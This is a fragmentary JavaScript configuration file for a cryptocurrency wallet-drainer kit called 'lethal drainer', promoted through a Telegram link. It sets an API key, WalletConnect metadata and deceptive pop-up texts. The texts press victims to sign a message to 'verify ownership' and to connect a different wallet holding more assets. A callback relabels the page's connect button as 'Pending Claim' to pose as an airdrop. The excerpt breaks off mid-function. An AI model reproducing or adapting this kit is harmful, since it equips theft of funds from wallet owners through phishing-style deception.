/**
 * Configuration files for lethal drainer https://t.me/lethaldrainer
 */
 ...
 */
let ankr_api_key =
  "9770019b7e7cedf7db08905aaa7b5b24a530f7013515fd362752c61f88ae4d65";
...
let popup_messages = {
  ...
  not_eligible: {
    title: "Error",
    inner:
      "This wallet is not eligible due to having low funds. Please use a different wallet with enough assets",
  },
  sign: {
    title: "",
    inner:
      "Please sign the message in your wallet so we can verify your ownership",
  },
  sign_error: {
    title: "Error",
    inner:
      "Something went wrong while signing your wallet. Please try again with a different wallet, or update your extension",
  },
...
let walletconnect_metadata = {
  ...
  icons: ["https://avatars.githubusercontent.com/u/25111032"],
};
...
function callback(event, data) {
  if (event === "CONNECTED") {
    const claimButton = document.querySelector(".connectButton");
    claimButton.textContent = "Pending Claim";
  }
  if (event === "NOT_ELIGIBLE") {
    const claimButton = document.querySelector(".connectButton");
